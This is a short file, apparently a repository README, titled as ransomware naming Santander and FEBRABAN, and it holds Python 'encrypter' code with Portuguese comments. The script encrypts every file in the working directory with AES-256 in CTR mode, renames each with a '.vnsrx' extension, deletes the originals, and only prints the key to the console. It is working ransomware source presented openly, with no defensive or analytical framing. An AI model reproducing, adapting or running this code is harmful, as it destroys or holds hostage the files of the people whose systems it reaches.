# SANTANDER_FEBRABAN_RANSOMWARE

ENCRYPTER
'''python
import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

def generate_random_key(length=32):
    """Gera uma chave aleatória de 32 bytes."""
    return get_random_bytes(length)

def encrypt_file(file_name, key):
    try:
        # Lê os dados do arquivo
        with open(file_name, "rb") as file:
            file_data = file.read()

        # Cria um objeto AES com AES-256 no modo CTR
        cipher = AES.new(key, AES.MODE_CTR)

        # Criptografa os dados
        encrypted_data = cipher.encrypt(file_data)

        # Salva os dados criptografados em um novo arquivo
        new_file_name = file_name + ".vnsrx"
        with open(new_file_name, "wb") as file:
            file.write(cipher.nonce + encrypted_data)

        print(f"Arquivo {file_name} criptografado com sucesso e salvo como {new_file_name}!")

        # Verifica se o arquivo criptografado foi criado com sucesso
        if os.path.isfile(new_file_name):
            # Remove o arquivo original
            os.remove(file_name)
            print(f"Arquivo original {file_name} foi removido.")
        else:
            print(f"Erro: O arquivo criptografado {new_file_name} não foi criado.")
    except Exception as e:
        print(f"Ocorreu um erro: {e}")

def main():
    # Gera uma chave aleatória de 32 bytes
    key = generate_random_key(32)
    print(f"Chave gerada (não exiba esta chave para garantir segurança): {key.hex()}")

    # Processa os arquivos no diretório
    for file_name in os.listdir('.'):
        if os.path.isfile(file_name) and not file_name.endswith('.vnsrx') and file_name != os.path.basename(__file__):
            encrypt_file(file_name, key)

if __name__ == "__main__":
    main()

